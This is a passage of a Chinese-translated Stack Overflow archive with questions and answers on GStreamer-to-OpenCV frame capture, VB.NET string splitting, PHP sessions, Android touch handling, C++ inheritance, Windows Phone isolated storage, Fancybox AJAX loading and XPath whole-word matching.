  gstreamer-1.0 gstreamer-allocators-1.0 gstreamer-insertbin-1.0 gstreamer-plugins-base-1.0 \
  gstreamer-codecparsers-1.0 gstreamer-base-1.0 gstreamer-app-1.0 gstreamer-check-1.0 \
  gstreamer-controller-1.0 gstreamer-video-1.0 gstreamer-fft-1.0 gstreamer-mpegts-1.0 \
  gstreamer-pbutils-1.0 gstreamer-rtp-1.0 gstreamer-rtsp-1.0 \
  gstreamer-riff-1.0 gstreamer-audio-1.0 gstreamer-plugins-bad-1.0 opencv)

OPENCV_FLAGS=$(shell pkg-config --cflags --libs opencv)

all: gst_opencv

gst_opencv: gst_opencv
    g++ $(GST_FLAGS) $(OPENCV_FLAGS) gst_opencv -o gst_opencv

clean:
    rm -f gst_opencv 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-05-10T18:37:09.103

所以。经过一段时间的搜索，我找到了一个解决方案，它涉及从缓冲区中检索数据。所以想法是创建playbin并将appsink设置为“video-sink”。这是代码示例：

```
cout<<"Creating appsink"<<endl;
appsink = gst_element_factory_make("appsink", "asink");
gst_app_sink_set_emit_signals((GstAppSink*)appsink, true);
gst_app_sink_set_drop((GstAppSink*)appsink, true);
gst_app_sink_set_max_buffers((GstAppSink*)appsink, 1);

//creating and initialising pipeline

g_object_set(G_OBJECT(playbin), "video-sink", appsink, NULL);

g_signal_connect(appsink, "new-buffer", G_CALLBACK(DisplayFrame), (gpointer) mark);

//callback function looks like this

gboolean Core::DisplayFrame(GstAppSink *fks, gpointer mark)
{
static bool init = false;
static IplImage *frame;
GstBuffer* buf;
Mark* mk = (Mark*) mark;

if(!init)
{
    init = true;
    frame = cvCreateImage(cvSize(mk->frame_w, mk->frame_h), IPL_DEPTH_8U, 1);
}
buf = gst_app_sink_pull_buffer(fks);
frame->imageData = (char*)GST_BUFFER_DATA(buf);

ProcessFrame(frame);
gst_buffer_unref(buf);
return true;
} 
```

这行得通。PS。有很多关于这种方法的信息，但我花了很多时间寻找它。所以我决定把它贴在这里，以便至少提供一些关键词来搜索。

更新。还有更多关于连接 gstreamer 和 opencv 的信息。现在是关于将缓冲区转换为 iplimage 的问题。首先，我们需要接收 rgb 缓冲区，以使转换尽可能简单。为了做到这一点，我们将用连接到 ffmpegcolorspace 的 appsink 替换 appsinks

```
cout<<"Creating appsink"<<endl;
appsink = gst_element_factory_make("appsink", "asink");
gst_app_sink_set_emit_signals((GstAppSink*)appsink, true);
gst_app_sink_set_drop((GstAppSink*)appsink, true);
gst_app_sink_set_max_buffers((GstAppSink*)appsink, 1);
csp = gst_element_factory_make("ffmpegcolorspace", "csp");
sinkpipe = gst_pipeline_new("sinkp");
gst_bin_add_many(GST_BIN(sinkpipe), csp, appsink, NULL);
gst_element_link_filtered(csp, appsink, gst_caps_new_simple("video/x-raw-rgb", NULL));
pad = gst_element_get_static_pad(csp, "sink");
gst_element_add_pad(sinkpipe, gst_ghost_pad_new("ghost", pad));
g_object_unref(pad);

//...

g_object_set(G_OBJECT(playbin), "video-sink", sinkpipe, NULL);

//...

g_signal_connect(appsink, "new-buffer", G_CALLBACK(GetFrame), (gpointer) mark);

//...

//caps_struct can be retrieved via writing data probe
//search for it in streamer manual

cout<<"Getting frame resolution"<<endl;
gst_structure_get_int(caps_struct, "width", &(mark->frame_w));
gst_structure_get_int(caps_struct, "height", &(mark->frame_h));
gst_structure_get_int(caps_struct, "depth", &depth);

mark->GeneratePoints();
frame = cvCreateImage(cvSize(mark->frame_w, mark->frame_h), depth/3, 3);

//callback function

gboolean Core::GetFrame(GstAppSink *fks, gpointer frame)
{

IplImage* frame_temp = frame
IplImage* frame_temp_two = cvCloneImage(frame_temp);

GstBuffer* buf;
buf = gst_app_sink_pull_buffer(fks);
frame_temp_two->imageData = (char*) GST_BUFFER_DATA(buf);
cvConvertImage(frame_temp_two, frame_temp, CV_CVTIMG_SWAP_RB);
ProcessFrame(frame_temp);
gst_buffer_unref(buf);
return true;
} 
```

我希望这会对某人有所帮助。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2018-06-07T12:22:58.473

我无法评论 Mikael 的帖子（没有足够的分数）。我在程序中做了一些修改和更正，你可以在这里查看我的要点。 [https://gist.github.com/patrickelectric/5dca1cb7cef4ffa7fbb6fb70dd9f9edc](https://gist.github.com/patrickelectric/5dca1cb7cef4ffa7fbb6fb70dd9f9edc)

```
/**
* Based on:
* https://stackoverflow.com/questions/10403588/adding-opencv-processing-to-gstreamer-application
*/

// Include atomic std library
#include <atomic>

// Include gstreamer library
#include <gst/gst.h>
#include <gst/app/app.h>

// Include OpenCV library
#include <opencv.hpp>

// Share frame between main loop and gstreamer callback
std::atomic<cv::Mat*> atomicFrame;

/**
* @brief Check preroll to get a new frame using callback
*  https://gstreamer.freedesktop.org/documentation/design/preroll.html
* @return GstFlowReturn
*/
GstFlowReturn new_preroll(GstAppSink* /*appsink*/, gpointer /*data*/)
{
    return GST_FLOW_OK;
}

/**
* @brief This is a callback that get a new frame when a preroll exist
*
* @param appsink
* @return GstFlowReturn
*/
GstFlowReturn new_sample(GstAppSink *appsink, gpointer /*data*/)
{
    static int framecount = 0;

    // Get caps and frame
    GstSample *sample = gst_app_sink_pull_sample(appsink);
    GstCaps *caps = gst_sample_get_caps(sample);
    GstBuffer *buffer = gst_sample_get_buffer(sample);
    GstStructure *structure = gst_caps_get_structure(caps, 0);
    const int width = g_value_get_int(gst_structure_get_value(structure, "width"));
    const int height = g_value_get_int(gst_structure_get_value(structure, "height"));

    // Print dot every 30 frames
    if(!(framecount%30)) {
        g_print(".");
    }

    // Show caps on first frame
    if(!framecount) {
        g_print("caps: %s\n", gst_caps_to_string(caps));
    }
    framecount++;

    // Get frame data
    GstMapInfo map;
    gst_buffer_map(buffer, &map, GST_MAP_READ);

    // Convert gstreamer data to OpenCV Mat
    cv::Mat* prevFrame;
    prevFrame = atomicFrame.exchange(new cv::Mat(cv::Size(width, height), CV_8UC3, (char*)map.data, cv::Mat::AUTO_STEP));
    if(prevFrame) {
        delete prevFrame;
    }

    gst_buffer_unmap(buffer, &map);
    gst_sample_unref(sample);

    return GST_FLOW_OK;
}

/**
* @brief Bus callback
*  Print important messages
*
* @param bus
* @param message
* @param data
* @return gboolean
*/
static gboolean my_bus_callback(GstBus *bus, GstMessage *message, gpointer data)
{
    // Debug message
    //g_print("Got %s message\n", GST_MESSAGE_TYPE_NAME(message));
    switch(GST_MESSAGE_TYPE(message)) {
        case GST_MESSAGE_ERROR: {
            GError *err;
            gchar *debug;

            gst_message_parse_error(message, &err, &debug);
            g_print("Error: %s\n", err->message);
            g_error_free(err);
            g_free(debug);
            break;
        }
        case GST_MESSAGE_EOS:
            /* end-of-stream */
            break;
        default:
            /* unhandled message */
            break;
    }
    /* we want to be notified again the next time there is a message
    * on the bus, so returning TRUE (FALSE means we want to stop watching
    * for messages on the bus and our callback should not be called again)
    */
    return true;
}

int main(int argc, char *argv[]) {
    gst_init(&argc, &argv);

    gchar *descr = g_strdup(
        "udpsrc port=5600 "
        "! application/x-rtp, payload=96 ! rtph264depay ! h264parse ! avdec_h264 "
        "! decodebin ! videoconvert ! video/x-raw,format=(string)BGR ! videoconvert "
        "! appsink name=sink emit-signals=true sync=false max-buffers=1 drop=true"
    );

    // Check pipeline
    GError *error = nullptr;
    GstElement *pipeline = gst_parse_launch(descr, &error);

    if(error) {
        g_print("could not construct pipeline: %s\n", error->message);
        g_error_free(error);
        exit(-1);
    }

    // Get sink
    GstElement *sink = gst_bin_get_by_name(GST_BIN(pipeline), "sink");

    /**
    * @brief Get sink signals and check for a preroll
    *  If preroll exists, we do have a new frame
    */
    gst_app_sink_set_emit_signals((GstAppSink*)sink, true);
    gst_app_sink_set_drop((GstAppSink*)sink, true);
    gst_app_sink_set_max_buffers((GstAppSink*)sink, 1);
    GstAppSinkCallbacks callbacks = { nullptr, new_preroll, new_sample };
    gst_app_sink_set_callbacks(GST_APP_SINK(sink), &callbacks, nullptr, nullptr);

    // Declare bus
    GstBus *bus;
    bus = gst_pipeline_get_bus(GST_PIPELINE(pipeline));
    gst_bus_add_watch(bus, my_bus_callback, nullptr);
    gst_object_unref(bus);

    gst_element_set_state(GST_ELEMENT(pipeline), GST_STATE_PLAYING);

    // Main loop
    while(1) {
        g_main_iteration(false);

        cv::Mat* frame = atomicFrame.load();
        if(frame) {
            cv::imshow("Frame", atomicFrame.load()[0]);
            cv::waitKey(30);
        }
    }

    gst_element_set_state(GST_ELEMENT(pipeline), GST_STATE_NULL);
    gst_object_unref(GST_OBJECT(pipeline));
    return 0;
} 
```

# vb.net - visual basic 2010 如何在字符串中找到“=”

> ID：10403592
> 
> 赞同：0
> 
> 时间：2012-05-01T20:06:19.880
> 
> 标签：vb.net, visual-studio-2010

```
string = "I was born in = 1994" 
```

如何将“=”之后的所有值存储在var中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:09:17.490

这是最简单的方法：

```
Dim var = s.Substring(s.IndexOf("="c) + 1) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-02T07:47:57.360

您可以使用[拆分](http://msdn.microsoft.com/en-us/library/6x627e5f%28v=vs.80%29.aspx)功能：

```
 Dim [string] = "I was born in = 1994"
  Dim temp() As String = Split([string], " = ", -1, CompareMethod.Binary)
  'now value is in temp(1)
  MessageBox.Show(temp(1)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:14:46.797

有很多方法，我会在字符串中使用。

```
mystring as new string
mystring  = "I was born in =1994"
DataAfterEquals as string = mid(mystring,instr(mystring,"=")+1,mystring.length-instr(mystring,"=")+1) 
```

您当然可以使用正则表达式，使用拆分，然后您当然可以采用非常老式的方式并遍历字符串以找到等号。

上面的代码会找到第一个等号，然后从字符串中的那个点向外解析，所以我添加了+1来跳过等号。这个伪代码。

# php - 为什么我不能在 php 中取消设置会话？

> ID：10403593
> 
> 赞同：2
> 
> 时间：2012-05-01T20:06:22.643
> 
> 标签：php, javascript, session

我正在编写一些代码以允许用户在餐厅预订餐桌。但我的客户要求我允许用户从餐厅菜单中选择一些项目，然后回来预订餐桌。如果用户不想选择菜单，那么他们可能会忽略该步骤。

为此，我只打印了一条消息“您要选择菜单吗？” 然后是指向菜单页面的超链接。我使用 iavascript onClick 事件来监听用户是否单击，如果单击，我调用函数 setsession 来设置会话以跟踪用户在我的网站中的活动。我在 page.like- 顶部声明了我的函数

```
 <script>
    function setsession(){
    <?php $_session['reservation']= TRUE;
    }
    </script>
<form action="" method="post">
    <p>Do you want to choose menu? Then <a href="somepage.php" onClick="setsession()">Click here.</a></p>
<p>rest of my code</p>
<p>confirm to reserve.</p>
<a href="javascript:{}" onclick="return Validate();submitform();">Confirm</a>
</form>

<?php if(isset($addnew) && !$error) ?>
<div class="success">
<p>sucess</p>
<?php $_SESSION['reservationprocess'] = FALSE;?>
</div>
<?php } ?> 
```

一切正常。当我成功单击超链接时，我的会话变量。当我点击确认按钮（上面的超链接）时，它成功地将数据存储在数据库中并成功提取消息并取消设置会话。

但问题是我不知道我的会话如何以及为什么再次设置。我试图取消我的会话多少，但我失败了。据我所知，我的其余代码运行良好，没有问题。我已经测试过了。专家有什么解决办法吗？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:09:38.647

这很不自然，但要销毁会话，您需要确保`session_start()`事先已调用。

要销毁会话，您不能在该 JavaScript 函数中执行此操作。您将需要向服务器发出 HTTP 请求，然后此请求将需要触发“PHP”函数删除您的会话。

通过阅读您对下面帖子的评论，我假设您只想删除会话的单个变量。也许试试这个：

```
session_start();
unset($_SESSION['reservationprocess']); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-02T06:12:14.983

不知道为什么你没有任何理由在脚本中有会话变量 第二我认为，当你加载页面时，你的变量被分配，这可能是它再次设置的原因。在初始化或分配变量时进行某种检查。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:10:17.883

session 必须初始化（如果之前没有初始化） session_start() 会做，另一个技巧是使用 session_destroy() 而不是未设置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T20:12:30.800

你应该在这里做的是移动这个调用：

```
<?php $_session['reservation']= TRUE;?> 
```

.. 到您的菜单页面。因此，当菜单页面加载时，此会话已设置。然后，当您完成后，您可以使用 session_destroy() 取消设置变量。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-05-05T19:58:07.267

很抱歉再次打扰您。但这次不是问一些新手问题，而是回答我自己的问题。

首先，我将简要地写下我的问题。我想捕捉一个事件，并希望使用该事件在我的会话中存储一些值，以在我的站点的其余部分识别该事件，除非会话被某种方式破坏。.php 文件中使用的所有变量都将值存储在其中，并在它们在服务器上时执行所有操作。浏览器显示结果。当用户做某事[在我的情况下单击]时，我们怎么能期望它只是将一个值存储在一个 php 变量中，而浏览器中没有 php 变量。所以我们可以做的只是将结果存储在一个 javascript 变量中，或者返回服务器并将值设置为变量。使用 ajax 调用服务器是专家的一种方法，老实说我不太了解。所以我需要寻找一些我已经知道的东西。当然是基于php的。最后我得到了COOKIE。要捕获事件，使用 javascript 很明显。我使用了一个使用 jQuery 的事件侦听器，并在其中将一个值存储在浏览器的 cookie 中。然后使用 javascript 和 php 检查我网站中的 cookie。这有一个后备。如果用户禁用 cookie，那么您将无法使用它。

# android - Android ImageButton如何拥有比图像本身更大的可点击区域？

> ID：10403604
> 
> 赞同：13
> 
> 时间：2012-05-01T20:06:56.987
> 
> 标签：android

我在代表图标的屏幕上有一个小的 Android ImageButton。问题是难以触摸和激活。我不想增加图像本身的大小，但我想扩大可点击区域并使其更大，因此如果用户离图像足够近，它将激活 onClick 事件。如果不为周围的屏幕区域实现 onTouch 事件，如何做到这一点？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-05-01T20:12:03.637

您可以将您的包装`ImageButton`在另一个中`ViewGroup`并在`ViewGroup`. 然后你会听到点击`ViewGroup`。这是一个例子：

```
<FrameLayout
    android:id="@+id/button_layout"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:padding="20dp" >

    <ImageButton
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/my_button"
        android:duplicateParentState="true"
        android:clickable="false"
        android:focusable="false" />

</FrameLayout> 
```

然后，您将监听 上的点击`R.id.button_layout`，并且您`ImageButton`应该收到与父布局相同的所有状态（按下、点击等）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:10:05.430

我有类似的情况......我只是使用相对布局放置图标，然后直接在其顶部放置一个较大的按钮，该按钮使用在正常状态下完全透明的可绘制对象，并为按下/聚焦添加半透明颜色/ETC。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:12:46.383

我不确定我们的布局是如何配置的，但我想到的一件事是使用相对布局。创建具有大透明背景的图标。您将不得不摆弄布局以使其正确定位，但透明区域也将是可点击的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-05-27T11:18:40.887

另一种方法是`TouchDelegate`在您想要扩展其可点击区域的子视图的父布局上进行设置。

从技术上讲，`View`可以将定义范围内的触摸事件委托给其他视图。您需要创建一个`TouchDelegate`接收两个参数的：
a）`bounds`要委托给其他视图的可触摸区域
b）`view`您要接收此触摸事件

```
TouchDelegate delegate = new TouchDelegate(bounds, view); 
```

然后你可以将它传递给父视图：

```
parent.setTouchDelegate(delegate); 
```

现在您的父视图会将定义内的触摸事件委托`bounds`给`child`您传递的。

这是一个完整的例子：

```
public class ExpandTouchableAreaActivity extends AppCompatActivity {

  FrameLayout rootFrame;
  Button btnHello;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_expand_touchable_area);
    rootFrame = findViewById(R.id.root_frame);
    btnHello = findViewById(R.id.btn_hello);
    btnHello.setOnClickListener(new View.OnClickListener() {
      @Override
      public void onClick(View v) {
        Toast.makeText(ExpandTouchableAreaActivity.this, "Hello", Toast.LENGTH_SHORT).show();
      }
    });
    expandTouchableArea(rootFrame, btnHello);
  }

  public static void expandTouchableArea(final View parent, final View child) {
    child.addOnLayoutChangeListener(new View.OnLayoutChangeListener() {
      @Override
      public void onLayoutChange(View v, int left, int top, int right, int bottom, int oldLeft, int oldTop, int oldRight, int oldBottom) {
        int expansion = 100; // how much pixels you want to expand touchable are (on each side)
        Rect bounds = new Rect(left - expansion, top - expansion, right + expansion, bottom + expansion);
        TouchDelegate delegate = new TouchDelegate(bounds, child);
        parent.setTouchDelegate(delegate);
      }
    });

  }

} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-02-17T20:20:59.267

**简单的方法：**

```
 <ImageButton
  ..
  android:padding="16dp"
  android:margin="-16dp"
  .. /> 
```

# android - Android点击限制器

> ID：10403606
> 
> 赞同：0
> 
> 时间：2012-05-01T20:07:02.687
> 
> 标签：android, tap

我正在为 android 制作一个简单的侧面滚动应用程序，用户必须躲避进入那里的障碍物，目前用户点击屏幕跳跃，这是由`onTouchEvent()`方法拾取的，问题是如果用户反复点击screen 角色上下跳跃，然后重复用户点击的次数，我不会做的是让应用程序只接受用户的第一次点击。有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:12:12.840

当您阅读点击时，设置一个标志以显示点击响应（跳转）正在进行中。当标志条件为真时，接受点击事件并丢弃它们。当你准备好再次跳跃时，清除标志。最简单的方法可能是存储系统时钟时间并且只知道跳转的持续时间。但是您也可以使用其他一些标准，例如到达跳跃动画的结尾。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:11:32.110

只需创建一个已处理标志，直到触发完整事件，然后再次允许输入。

IE。

```
bool beingHandled = false;
onTouch(){
  if (beingHandled)
    return;
  beingHandled = true;
  //code  .... ///
  beingHandled = false;  
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:13:19.613

在 onTouchEvent() 方法中维护一个静态变量，用于跟踪最后一次按下，并且只有在足够的时间过去后才调用 characterJump() 函数。您甚至可以使用几个变量...自上次 characterJump() 调用以来的时间以及自上次触摸事件以来的时间，以允许在多次按下后跳转（如果它们继续）

# c++ - 运行基类函数，然后继承类函数

> ID：10403608
> 
> 赞同：0
> 
> 时间：2012-05-01T20:07:10.080
> 
> 标签：c++, oop

> **可能重复：**
> [如何强制子相同的虚函数首先调用其父虚函数](https://stackoverflow.com/questions/5644338/how-to-force-child-same-virtual-function-call-its-parent-virtual-function-first)

**编辑人们完全忽略了这一点：我要说的是，如果很多类都继承了 Base，我不想`Base::myFunction()`每一个都调用！**

* * *

我不太确定如何表达这个问题，但我希望从代码中可以明显看出（这可能无法真正编译，我写得很快）：

```
class Base
{
    bool flag = false;

    void myFunction ()
    {
        flag = true;

        // here run the inherited class's myFunction()
    }
};

class A : public Base
{
    void myFunction ()
    {
        // do some clever stuff without having to set the flags here.
    }
};

int main ()
{
    A myClass;
    myClass.myFunction(); // set the flags and then run the clever stuff
    std::cout << myClass.flag << endl; // should print true
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:11:09.800

首先 - 如果您将使用指针，请使用虚拟函数。然后你只需要在派生类实现中调用基类myFunction。参见示例：

```
class Base
{
    bool flag = false;

    virtual void myFunction ()
    {
        flag = true;
    }
};

class A : public Base
{
    virtual void myFunction ()
    {
        Base::myFunction();  // call base class implementation first
        // do some clever stuff without having to set the flags here.
    }
};

int main ()
{
    A myClass;

    myClass.myFunction(); // set the flags and then run the clever stuff

    std::cout << myClass.flag << endl; // should print true

    return 0;
} 
```

如果你不喜欢在所有派生类中调用你的基类函数。您可以为“聪明”的计算添加特殊的虚函数，并在所有派生类中分别实现。例子：

```
class Base
{
    bool flag = false;

    virtual void cleverCalc() = 0;
    virtual void myFunction ()
    {
        flag = true;
        cleverCalc();
    }
};

class A : public Base
{
    virtual void cleverCalc()
    {
        // do some clever stuff without having to set the flags here.
    }
}; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-01T20:10:05.947

```
class A : public Base
{
    void myFunction ()
    {
        Base::myFunction();    // <-------------------------------
        // do some clever stuff without having to set the flags here.
    }
}; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-01T20:17:58.863

您使用空实现（将在子类中覆盖）创建另一个函数，并在您的`myFunction`. 像这样的东西：

```
class Base
{
    bool flag = false;

    void myFunction ()
    {
        flag = true;

        // here run the inherited class's myFunction()
        myDerivedFunction();
    }

    virtual void myDerivedFunction()
    {
        // this should be implemented by subclasses.
    }
};

class A : public Base
{
    void myDerivedFunction ()
    {
        // do some clever stuff without having to set the flags here.
    }
}; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T20:11:40.847

凭借您的继承结构，派生类中的 myFunction() 调用排除了基类中版本的调用，因此标志永远不会设置为“true”。

# c# - 获取IsolatedStorageException：在IsolatedStorageFileStream 上不允许操作

> ID：10403631
> 
> 赞同：9
> 
> 时间：2012-05-01T20:09:09.160
> 
> 标签：c#, windows-phone-7

我在以下代码中遇到上述异常和错误，该代码旨在播放来自独立存储的选定 mp3 文件：

```
using (var isf = IsolatedStorageFile.GetUserStoreForApplication())
{            
     using (var isfs = isf.OpenFile(selected.Path, FileMode.Open))
     {                        
          this.media.SetSource(isfs);              
          isfs.Close();                        
     }                    
     isf.Dispose();
} 
```

该错误是如此模糊，以至于我不确定可能出了什么问题...我可以检查的任何想法或至少是该错误的常见来源？

编辑：异常被抛出：`using(var isfs = isf.OpenFile(...))`

编辑2：堆栈跟踪...

```
at System.IO.IsolatedStorage.IsolatedStorageFileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, IsolatedStorageFile isf)
at System.IO.IsolatedStorage.IsolatedStorageFileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, IsolatedStorageFile isf)
at System.IO.IsolatedStorage.IsolatedStorageFileStream..ctor(String path, FileMode mode, IsolatedStorageFile isf)
at Ringify.Phone.PivotContent.RingtoneCollectionPage.MediaIconSelected(Object sender, GestureEventArgs e)
at MS.Internal.CoreInvokeHandler.InvokeEventHandler(Int32 typeIndex, Delegate handlerDelegate, Object sender, Object args)
at MS.Internal.JoltHelper.FireEvent(IntPtr unmanagedObj, IntPtr unmanagedObjArgs, Int32 argsTypeIndex, Int32 actualArgsTypeIndex, String eventName) 
```

我也意识到，如果我播放一首歌曲然后停止它（用户界面中有一个播放和暂停按钮），然后播放另一首歌曲，则不会发生错误。当我播放一首歌曲，停止它并尝试再次播放同一首歌曲时，就会发生这种情况。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-01T21:43:08.590

当您播放相同的音乐两次时会出现此问题，因此可能是文件共享问题。您应该尝试提供该`OpenFile`方法的 FileShare 参数：

```
var isfs = isf.OpenFile(selected.Path, FileMode.Open, FileShare.Read) 
```

虽然我不明白为什么会发生这种情况，因为您明确关闭了文件。

**编辑：**好的，用反射器做了一些挖掘，我想通了。MediaElement.SetSource 的代码是：

```
public void SetSource(Stream stream)
{
    if (stream == null)
    {
        throw new ArgumentNullException("stream");
    }
    if (stream.GetType() != typeof(IsolatedStorageFileStream))
    {
        throw new NotSupportedException("Stream must be of type IsolatedStorageFileStream");
    }
    IsolatedStorageFileStream stream2 = stream as IsolatedStorageFileStream;
    stream2.Flush();
    stream2.Close();
    this.Source = new Uri(stream2.Name, UriKind.Absolute);
} 
```

所以基本上它不使用你提供的流，甚至关闭它。但它保留了文件的名称，我猜它会在你播放音乐时重新打开它。因此，如果您在播放音乐时尝试以独占访问权限重新打开同一文件，则会失败，因为 MediaElement 已打开该文件。棘手。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:59:21.603

我相信您应该使用[IsolatedStorageFileStream](http://msdn.microsoft.com/en-us/library/system.io.isolatedstorage.isolatedstoragefilestream%28v=vs.95%29.aspx)：

```
using (var isf = IsolatedStorageFile.GetUserStoreForApplication())
{            
     using (var isfs = new IsolatedStorageFileStream(selected.Path, FileMode.Open, isf))
     {                        
          this.media.SetSource(isfs);              
     }                    
} 
```

另外，请注意，您不需要调用`.Close()`or`.Dispose()`方法，因为它们在 using 语句中得到处理。

# jquery - 将动态 AJAX 内容加载到 Fancybox

> ID：10403634
> 
> 赞同：8
> 
> 时间：2012-05-01T20:09:17.503
> 
> 标签：jquery, ajax, fancybox

**这个场景：**

用户将他的 zip 插入到输入字段中，当点击魔法按钮时，他可以看到离他最近的商店。我称该服务非常好，并加载了一些 AJAX 优点。一切都很好。

现在，我不想将结果插入页面上的某个位置，而是希望它显示在 Fancybox 中。我根本无法完成这项工作。

**JavaScript：**

```
$('#button').on('click', function(){    
   // Function to build the URL edited out for simplicity       
   var nzData = '/url.com?Zip=8000 #module';

   $.fancybox({
      ajax: { 
         data: nzData
        }
    });
}); 
```

我希望 Fancybox 弹出并显示来自 URL ( `nzData`) 的标记。Fancybox 加载，但不是内容，而是一个字符串，上面写着“*无法加载请求的内容。请稍后再试。* ”。

这不是服务的问题，所以我怀疑这只是我忽略了某些东西或强奸了 Fancybox API。那么，我做错了什么？

编辑：我忘了提，我使用的是旧版本的 Fancybox (v1.3.4)。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-12T06:25:30.957

我知道这是一个老问题，但我最近不得不处理类似的事情。这是我将ajax加载到fancybox中所做的。

```
$('#button').on('click', function(){
    $.fancybox({
        width: 400,
        height: 400,
        autoSize: false,
        href: '/some/url-to-load',
        type: 'ajax'
    });
}); 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2014-09-06T17:11:40.010

fancybox 使用参数“ajax”，您可以在其中传递配置（如[jquery](http://api.jquery.com/jquery.ajax/)所述）

```
$("#button").click(function() {
    $.fancybox.open({
        href: "ajax.php",
        type: "ajax",
        ajax: {
            type: "POST",
            data: {
                temp: "tada"
            }
        }
    });
}); 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-05-02T09:07:29.650

如果要将 url 加载为 ajax，则必须设置 type -

```
$.fancybox({
  href : nzData,
  type : 'ajax'
}); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-05-02T09:51:08.283

我最终将内容加载到页面上的隐藏容器中，然后在 Fancybox 中显示该内容。

```
$('#button').on('click', function(){    
   var nzData = '/url.com?Zip=8000 #module';

     $('#foo').load(nzData, function(){
       var foo = $('#foo').html(); 
       $.fancybox(foo);
    });

}); 
```

我承认这不是很漂亮，但这是我让它工作的唯一方法。今天早上我与另一位开发人员交谈，他在类似问题中采用了相同的解决方案。

不过，必须有更好的解决方案。如果有人知道，我很想听听！

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-02-16T09:44:06.453

我有兴趣做同样的事情。我找到了一个类似的解决方案，但是它与这里推荐的任何其他解决方案都不同。查看这两个 API 的文档后，这应该在 V1 或 V2 中工作。

```
$('#button').on('click', function(){    
    $('#foo').load('/content.html', function(){

        var $source = $(this);

        $.fancybox({
            content: $source,
            width: 550,
            title: 'Your Title',
            etc...
        });
    });
}); 
```

然后，您的数据容器。

```
<div id="foo" style="display: none;"></div> 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-01T20:18:52.440

尝试：

```
$.fancybox({
  type: 'ajax',
  ajax: { 
     url: nzData
    }
}); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-05-01T23:03:28.373

如果您想要`nzData`在fancybox中显示，请使用

```
$.fancybox(nzData,{
 // fancybox options
}); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-10-27T21:42:51.077

[https://stackoverflow.com/a/10546683/955745](https://stackoverflow.com/a/10546683/955745)

```
<a href="mypage.html #my_id" class="fancybox fancybox.ajax">Load ajax</a>
$(".fancybox").fancybox(); 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2015-06-15T14:25:13.447

我是这样做的：

你需要三个元素：

1）你需要一个 div 作为fancybox的容器，我们称之为#fancycontainer

2）#fancylink 是一个隐藏`<a>`的带有 href 的 fancybox div（在这种情况下`href="#fancycontainer"`）

3)#button 是加载所有内容的可点击元素。

在 onload 函数中添加以下代码：

```
$('#fancynlink').fancybox();

$('#button').click(function(){
  $.ajax({
    //OPTIONS...
    //..........
    success: function(data){
      //Here goes the code that fills the fancybox div
      $('#fancycontainer').append(blablabla.....);
      //And this launches the fancybox after everything has loaded
      $('#fancylink').trigger('click');
    }
}); 
```

希望这可以帮助某人

# regex - XPath：匹配整个单词（使用不区分大小写标志的匹配函数）

> ID：10403637
> 
> 赞同：6
> 
> 时间：2012-05-01T20:09:34.140
> 
> 标签：regex, search, xpath, xpath-2.0

使用 XPath，我想“匹配整个单词”（用户选项，就像在 VS 搜索中一样）。

尽管 match 允许使用不区分大小写的标志，但似乎功能`contains`和`matches`工作方式相似。`i`

换句话说，我通过这两个 XPath 查询得到了相同的结果：

```
<pets>
    <dog name="Rupert" color="grey"/>
    <dog name="Ralph" color="brown"/>
    <cat name="Marvin the Cat" color="white"/>
    <cat name="Garfield the Cat" color="orange"/>
    <cat name="Cat" color="grey"/>
    <cat name="Fluffy" color="black"/>
</pets>

Matches XPath: //cat[descendant-or-self::*[@*[matches(.,'Cat')]]]
    returns:
    <cat name="Marvin the Cat" color="white"/>
    <cat name="Garfield the Cat" color="orange"/>
    <cat name="Cat" color="grey"/>

Contains XPath: //cat[descendant-or-self::*[@*[contains(.,'Cat')]]]
    returns:
    <cat name="Marvin the Cat" color="white"/>
    <cat name="Garfield the Cat" color="orange"/>
    <cat name="Cat" color="grey"/> 
```

但我想`matches`用来返回匹配“猫”整个单词的结果：

```
<cat name="Cat" color="grey"/> 
```

如何调整匹配查询以匹配整个单词？

